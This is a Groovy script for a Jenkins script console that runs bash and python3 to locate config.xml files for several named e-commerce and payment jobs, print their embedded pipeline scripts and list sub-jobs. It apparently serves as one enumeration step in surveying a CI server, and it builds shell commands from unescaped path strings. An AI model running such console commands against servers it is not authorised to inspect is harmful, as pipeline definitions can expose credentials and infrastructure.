// MICRO-N: Read Jenkinsfiles from critical jobs via bash (no Groovy regex /s)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(4000)
}

// Read Jenkinsfile script using python3 to extract <script>...</script>
def readJenkinsfile = { path ->
    run("python3 -c \"import re,sys; txt=open('${path}').read(); m=re.search(r'<script>(.*?)</script>', txt, re.DOTALL); print(m.group(1)[:3000] if m else 'NO SCRIPT')\"")
}

def findConfig = { name ->
    run("find /var/jenkins_home/jobs -path '*${name}/config.xml' -not -path '*/builds/*' 2>/dev/null | head -1")
}

["cs_legacy_pipe_build_axii-claroshop",
 "cs_legacy_pipe_build_t1-admin-api",
 "cs_legacy_pipe_build_monedero-api"].each { jobName ->
    def cfgPath = findConfig(jobName).trim()
    println "\n=== JENKINSFILE: ${jobName} ==="
    println "Path: ${cfgPath}"
    if (cfgPath) println readJenkinsfile(cfgPath)
}

// Also show the full list of t1comercios sub-jobs and sears-ia-backend sub-jobs
println "\n=== T1COMERCIOS SUB-JOBS ==="
def r1 = run('find /var/jenkins_home/jobs/t1comercios -maxdepth 4 -name config.xml -not -path "*/builds/*" 2>/dev/null | head -30')
println r1

println "\n=== SEARS-IA-BACKEND SUB-JOBS ==="
def r2 = run('find /var/jenkins_home/jobs/sears-ia-backend -maxdepth 4 -name config.xml -not -path "*/builds/*" 2>/dev/null | head -30')
println r2

println "\n=== DONE MICRO-N ==="
